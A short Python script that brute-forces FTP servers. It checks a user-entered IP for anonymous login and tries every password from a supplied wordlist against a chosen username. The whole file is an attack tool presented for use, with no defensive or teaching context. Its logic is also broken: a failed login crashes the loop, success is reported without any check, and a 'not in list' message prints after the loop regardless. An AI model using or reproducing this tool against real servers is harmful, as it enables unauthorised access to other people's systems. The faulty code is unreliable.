import ftplib
ip=input('Enter the ip: ')

def anontest(username,passwords):
    for password in passwords:
        try:
            ftp=ftplib.FTP(ip)
            ftp.login(username,password)
            return True    
        except:
            print('login failed')




def main():
    
    option=int(input("""Enter your choice
    1.Anononymous check
    2.FTP Bruteforce \n"""))
    if option==1:
        username='anonymous'
        passwords=['ANONYMOUS','Anonymous','anonymous']
        if anontest(username,passwords):
            print('anonymous login allowed')
    elif option==2:
        usern=input('Enter the username: ')
        try:
            file=input('Enter the txt file name: ')
            pass_file=open(file,'r')
        except:
            print('File may not found or check neccessary permissions of the file')
            exit(0)
        for p in pass_file.readlines():
            passwo=p.strip('\n')
            ftp=ftplib.FTP(ip)
            ftp.login(usern,passwo)
            print('login successful with '+usern+'  '+passwo)
            ftp.quit()
            
        else:
            print('password not in list')
                
while True:        
    main()
